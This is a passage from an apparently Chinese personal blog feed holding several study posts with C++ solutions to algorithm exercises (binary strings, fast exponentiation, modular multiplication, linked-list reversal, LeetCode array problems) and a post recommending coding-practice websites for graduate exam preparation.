        <content type="html"><![CDATA[<h1 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h1><p><strong>题目描述</strong></p><p>Time Limit: 1000 ms<br>Memory Limit: 256 mb</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">对于长度为6位的一个01串，每一位都可能是0或1，一共有64种可能。它的前几个是：<br>000000<br>000001<br>000010<br>000011<br>000100<br>请按从小到大的顺序输出这64种01串。<br></code></pre></td></tr></table></figure><p><strong>输入输出格式</strong></p><p><strong>输出描述:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">输出64行，每行一个01串。<br></code></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">int</span> k[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">64</span>)&#123;<br><span class="hljs-keyword">int</span> c = i;<br><span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(c)&#123;<br><span class="hljs-keyword">if</span>(c&amp;<span class="hljs-number">1</span>) k[j] = <span class="hljs-number">1</span>;<span class="hljs-comment">//按位运算，如果位运算是1则更改数组的值。</span><br><span class="hljs-keyword">else</span> k[j] = <span class="hljs-number">0</span>;<br>            j++;<br>   c &gt;&gt;=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt;k[<span class="hljs-number">5</span>]&lt;&lt;k[<span class="hljs-number">4</span>]&lt;&lt;k[<span class="hljs-number">3</span>]&lt;&lt;k[<span class="hljs-number">2</span>]&lt;&lt;k[<span class="hljs-number">1</span>]&lt;&lt;k[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-built_in">endl</span>;<br>i++;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> c/c++ </tag>
            
            <tag> N诺 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机考研法宝</title>
      <link href="/2021/08/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E6%B3%95%E5%AE%9D/"/>
      <url>/2021/08/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E6%B3%95%E5%AE%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>胡小宁高考没有考入理想的大学是至今的遗憾，为了弥补这个遗憾，胡小宁一直在奋斗着。考研圆梦，毋庸置疑，是胡小宁最后的机会。谈到考研，它与高考不同，考研分为初试和复试。初试和复试同样重要。二者缺一不可。对于初试，胡小宁自己没什么经验，所以等成功上岸后会在这里总结自己的学习历程和学习经验。而对于复试，绝大多数学校都是以机试为主。所以计算机的复试方向很明确，就是要玩得转算法设计。胡小宁先在这里总结几个非常好的刷题网站，绝对霸道！</p><h1 id="刷题网站推荐"><a href="#刷题网站推荐" class="headerlink" title="刷题网站推荐"></a>刷题网站推荐</h1><h2 id="ACWING"><a href="#ACWING" class="headerlink" title="ACWING"></a>ACWING</h2><p>这是北京大学的y神建立的网站，如果你觉得自己很牛皮，不如来这个网站感受一下什么是高山仰止。y神对于比较经典的题目，会有很详细的视频讲解，而且是<mark class="hl-label red">free</mark> 的。它也有收费的活动，但绝对物超所值！</p><p><a href="https://www.acwing.com/">点我进网站</a>。</p><h2 id="N诺"><a href="#N诺" class="headerlink" title="N诺"></a>N诺</h2><p>此网站整合了许多高校考研复试机试真题，这还不去刷一刷？</p><p><a href="http://noobdream.com/DreamJudge/Contest/index_judge/">点我进网站</a>。</p><h2 id="leetcode"><a href="#leetcode" class="headerlink" title="leetcode"></a>leetcode</h2><p>不多说，懂得都懂。这个网站网址就不发了，连百度都能查得到- -。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学生党 </tag>
            
            <tag> 考研 </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACwing刷题之基本算法（位运算）</title>
      <link href="/2021/08/14/ACwing%E5%88%B7%E9%A2%98%E4%B9%8B%E5%9F%BA%E6%9C%AC%E7%AE%97%E6%B3%95%EF%BC%88%E4%BD%8D%E8%BF%90%E7%AE%97%EF%BC%89/"/>
      <url>/2021/08/14/ACwing%E5%88%B7%E9%A2%98%E4%B9%8B%E5%9F%BA%E6%9C%AC%E7%AE%97%E6%B3%95%EF%BC%88%E4%BD%8D%E8%BF%90%E7%AE%97%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="ACwing刷题之基本算法（位运算）"><a href="#ACwing刷题之基本算法（位运算）" class="headerlink" title="ACwing刷题之基本算法（位运算）"></a>ACwing刷题之基本算法（位运算）</h1><h2 id="a-b"><a href="#a-b" class="headerlink" title="a^b"></a>a^b</h2><p>求 a的 b 次方对 p 取模的值。</p><p><strong>输入格式</strong></p><p>三个整数 a,b,p在同一行用空格隔开。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示<code>a^b mod p</code>的值。</p><p><strong>数据范围</strong></p><ul><li><code>0≤a,b≤10^9</code></li><li><code>1≤p≤10^9</code></li></ul><p><strong>输入样例：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">3 2 7<br></code></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">2<br></code></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>本题要利用快速幂的思想。如果按暴力求解，那么求解百万次，O(n)的时间复杂度超级大。所以我们不妨换一种思路去求解，用数学的思维来分析如何精简计算步骤。</p><p>拿5来举例。5^7可以被拆解成什么呢？</p><ul><li>(5^1)<em>(5^2)</em>(5^4)</li></ul><p>1-&gt;2^0,2-&gt;2^1,4-&gt;2^2…以此类推，</p><p>倘若此时我们要算5^1000000。</p><p>我们可以算到2^19时停止，2^20本身&gt;=1000000(1024*1024&gt;1000000)。先算完上面的20个数。。然后看1000000的二进制怎么表示。<code>11110100001001000000</code>。找到了二进制，我们就把二进制对应位置的5^i乘进去。(因为同底指数相乘幂相加)。此时时间复杂度变成了O(logn)级别。</p><p>下面是代码实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> a, b, p;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; p;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>%p;<span class="hljs-comment">//先定义一个result。%p是为了防止测试数据模1.</span><br>    <span class="hljs-comment">//从b的个位开始考虑</span><br>    <span class="hljs-keyword">while</span>(b)&#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res = res*<span class="hljs-number">1ll</span>*a%p; <span class="hljs-comment">//&amp;代表位运算,ill是long long类型的，目的是强制转换防止溢出</span><br>        <span class="hljs-comment">//不断地循环，要先把十位、百位、千位...准备好</span><br>        a = a*<span class="hljs-number">1ll</span>*a%p;<br>        b &gt;&gt;= <span class="hljs-number">1</span>;<span class="hljs-comment">//把个位去掉</span><br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="一些知识点的补充"><a href="#一些知识点的补充" class="headerlink" title="一些知识点的补充"></a>一些知识点的补充</h3><ol><li>位运算符作用于位，并逐位执行操作。&amp;运算通常用于二进制取位操作，例如一个数 &amp;1的结果就是取二进制的最末位。</li><li>a&lt;&lt;b 表示把a转为二进制后左移b位（在后面添加 b个0）。例如100的二进制表示为1100100，100左移2位后（后面加2个零）：1100100&lt;&lt;2 =110010000 =400。</li><li>和&lt;&lt;相似，a&gt;&gt;b表示二进制右移b位（去掉末b位），相当于a除以2的b次方（取整）。</li><li>(a * b) % p = (a % p * b % p) % p</li></ol><h2 id="64位整数乘法"><a href="#64位整数乘法" class="headerlink" title="64位整数乘法"></a>64位整数乘法</h2><p>求 a 乘 b 对 p 取模的值。</p><p><strong>输入格式</strong></p><p>第一行输入整数a，第二行输入整数b，第三行输入整数p。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示<code>a*b mod p</code>的值。</p><p><strong>数据范围</strong></p><ul><li><code>1≤a,b,p≤10^18</code></li></ul><p><strong>输入样例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">3<br>4<br>5<br></code></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">2<br></code></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>本题和上题思路相同，利用快速幂的思想进行求解。a*b实际上是b个a相加。那么可以将b转化成二进制，然后利用位运算进行求解。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ull;<span class="hljs-comment">//因为64位很大</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    ull a,b,p;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; p;<br>    ull res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(b)&#123;<br>        <span class="hljs-keyword">if</span>(b &amp; <span class="hljs-number">1</span>)  res =(res+a)%p;<br>        a = a*<span class="hljs-number">2</span>%p;<br>        b &gt;&gt;=<span class="hljs-number">1</span>;<span class="hljs-comment">//去位</span><br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; res;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="最短Hamilton路径"><a href="#最短Hamilton路径" class="headerlink" title="最短Hamilton路径"></a>最短Hamilton路径</h2><p>给定一张 <code>n</code> 个点的带权无向图，点从 <code>0∼n−1</code> 标号，求起点 <code>0</code> 到终点 <code>n−1</code> 的最短 Hamilton 路径。</p><p>Hamilton 路径的定义是从 <code>0</code> 到 <code>n−1</code>不重不漏地经过每个点恰好一次。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行输入整数 <code>n</code>。</p><p>接下来 <code>n</code> 行每行 <code>n</code> 个整数，其中第 <code>i</code>行第 <code>j</code> 个整数表示点 <code>i</code>到 <code>j</code>的距离（记为 <code>a[i,j]</code>）。</p><p>对于任意的 x,y,z，数据保证 a[x,x]=0，a[x,y]=a[y,x]并且 a[x,y]+a[y,z]≥a[x,z]。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示最短 Hamilton 路径的长度。</p><h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><ul><li><code>1≤n≤20</code></li><li><code>0≤a[i,j]≤10^7</code></li></ul><h4 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">5</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">0</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">8</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">5 </span><span class="hljs-number">5</span> <span class="hljs-number">8</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">18<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> c/c++ </tag>
            
            <tag> acwing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACwing刷题之简单题（一）</title>
      <link href="/2021/08/13/ACwing%E5%88%B7%E9%A2%98%E4%B9%8B%E7%AE%80%E5%8D%95%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/08/13/ACwing%E5%88%B7%E9%A2%98%E4%B9%8B%E7%AE%80%E5%8D%95%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="ACwing刷题之简单题（一）"><a href="#ACwing刷题之简单题（一）" class="headerlink" title="ACwing刷题之简单题（一）"></a>ACwing刷题之简单题（一）</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>为了应付下学期的CCF考试，我在知乎上搜索刷题网站。看到有知乎er分享了这个acwing，打开之后很兴奋，这正是我想要的刷题网站。</p><h2 id="从尾到头打印链表"><a href="#从尾到头打印链表" class="headerlink" title="从尾到头打印链表"></a>从尾到头打印链表</h2><p>输入一个链表的头结点，按照 <strong>从尾到头</strong> 的顺序返回节点的值。</p><p>返回的结果用数组存储。</p><p><strong>样例</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">输入：[2, 3, 5]<br>返回：[5, 3, 2]<br></code></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">printListReversingly</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; res;<span class="hljs-comment">//创建一个容器，装一下链表中的元素</span><br>        <span class="hljs-keyword">while</span>(head)&#123;<br>            res.push_back(head-&gt;val);<br>            head = head-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; (res.rbegin(),res.rend());<span class="hljs-comment">//构造一个新的vector，rbegin和rend是从尾到头遍历，begin和end是从头到尾遍历。</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h2><p>定义一个函数，输入一个链表的头结点，反转该链表并输出反转后链表的头结点。</p><p><strong>思考题：</strong></p><ul><li>请同时实现迭代版本和递归版本。</li></ul><h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">输入:1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br><br>输出:5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL<br></code></pre></td></tr></table></figure><h3 id="思路-迭代"><a href="#思路-迭代" class="headerlink" title="思路(迭代)"></a>思路(迭代)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!head || !head-&gt;next) <span class="hljs-keyword">return</span> head;<br>        <span class="hljs-keyword">auto</span> a = head,b = a-&gt;next;<br>        <span class="hljs-keyword">while</span>(b)&#123;<br>          <span class="hljs-keyword">auto</span> c = b-&gt;next;<br>            b-&gt;next = a;<br>            a = b;<br>            b = c;<br>        &#125;<br>        head-&gt;next = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="思路（递归）"><a href="#思路（递归）" class="headerlink" title="思路（递归）"></a>思路（递归）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!head || !head-&gt;next) <span class="hljs-keyword">return</span> head;<br>        <span class="hljs-keyword">auto</span> tail = reverseList(head-&gt;next);<br>        head-&gt;next-&gt;next = head;<br>        head-&gt;next = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span> tail;<br>       <br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> c/c++ </tag>
            
            <tag> acwing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021暑假leetcode训练（四）</title>
      <link href="/2021/08/13/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2021/08/13/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="初级算法（四）"><a href="#初级算法（四）" class="headerlink" title="初级算法（四）"></a>初级算法（四）</h1><h2 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h2><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><p><strong>说明：</strong></p><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p><p><strong>示例 1:</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入: [2,2,1]<br>输出: 1<br></code></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入: [4,1,2,1,2]<br>输出: 4<br></code></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>使用异或运算，将所有值进行异或</li><li>异或运算，相异为真，相同为假，所以 <code>a^a = 0</code> ;<code>0^a = a</code></li><li>因为异或运算 满足交换律<code> a^b^a = a^a^b = b</code> 所以数组经过异或运算，单独的值就剩下了</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">singleNumber</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;nums.size();i++)&#123;<br>            res ^=nums[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210813011016806.png" alt="效果"></p><h2 id="两个数组的交集-II"><a href="#两个数组的交集-II" class="headerlink" title="两个数组的交集 II"></a>两个数组的交集 II</h2><p>给定两个数组，编写一个函数来计算它们的交集。</p><p><strong>示例 1：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入：nums1 = [1,2,2,1], nums2 = [2,2]<br>输出：[2,2]<br></code></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入：nums1 = [4,9,5], nums2 = [9,4,9,8,4]<br>输出：[4,9]<br></code></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>输出结果中每个元素出现的次数，应与元素在两个数组中出现次数的最小值一致。<br>我们可以不考虑输出结果的顺序。<br><strong>进阶：</strong></p><ul><li>如果给定的数组已经排好序呢？你将如何优化你的算法？</li><li>如果 nums1 的大小比 nums2 小很多，哪种方法更优？</li><li>如果 nums2 的元素存储在磁盘上，内存是有限的，并且你不能一次加载所有的元素到内存中，你该怎么办？</li></ul><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>先对两个数组进行排序，然后使用两个指针，分别指向两个数组开始的位置。</li><li>如果两个指针指向的值相同，说明这个值是他们的交集，就把这个值加入到集合list中，然后两个指针在分别往后移一步。</li><li>如果两个指针指向的值不同，那么指向的值相对小的往后移一步，相对大的先不动，然后再比较</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">intersect</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums1, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;<br>sort(nums1.begin(),nums1.end());<br>        sort(nums2.begin(),nums2.end());<br>         <span class="hljs-keyword">int</span> len1 = nums1.size();<br>         <span class="hljs-keyword">int</span> len2 = nums2.size();<br>        <span class="hljs-comment">//先对数组进行排序</span><br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-built_in">list</span>;<span 